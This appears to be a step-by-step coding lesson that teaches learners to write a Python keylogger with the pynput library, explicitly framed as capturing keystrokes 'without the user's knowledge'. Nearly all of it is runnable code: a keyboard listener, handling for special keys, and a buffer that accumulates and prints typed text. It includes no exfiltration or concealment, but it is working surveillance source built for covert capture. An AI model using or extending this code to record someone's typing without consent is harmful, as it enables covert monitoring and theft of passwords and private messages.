Detect the Button Press
======================
In this activity, you will code to detect the keystrokes on a computer without the user's knowledge.


<img src= "https://media.slid.es/uploads/1525749/images/10974016/C124_SA1.gif" width = "auto" height = "auto">




Follow the given steps to complete this activity.




1. Define a function `onPress()` that appends characters to the `text` string based on the key pressed from the keyboard.
   * Open the file `main.py`.
    * Define a global variable `text` that will hold the text entered by the user.
    ```
    text = 'Welcome to keylogger'
    ```
   * Define `onPress()` function to detect the key value for button press.
    ```
    def onPress(key):
        global text
    ```
    * Handle different key events like enter, tab, space, shift, etc. based on the key press.
    ```
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
    ```
    * Skip logging the output if shift or command keys are pressed.
    ```
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.cmd:
            pass
        elif key == keyboard.Key.cmd_r:
            pass
    ```
    * Handle the backspace key to either do nothing or remove the last character from the text variable.
    ```
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
    ```
    * Handle escape key events and append other keys to the text variable and print the updated text content.
    ```
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")  
        print(text)
    ```
2. Define a function `onRelease()` to be called when a key is released, and return `false` if the escape key is released.
    ```
    def onRelease(key):
        if key == Key.esc:
            return False
    ```


3. Set up a keyboard listener that calls the `onPress` function and the `onRelease` function when a key is released. 
    ```
    with Listener(on_press=onPress, on_release=onRelease) as listener:
        print("!!! WELCOME TO KEYLOGGER APP !!!")
        print("!!! APP IS READY TO LISTEN THE KEYS !!!")
        listener.join()
    ```


Save and run the code to check the output.
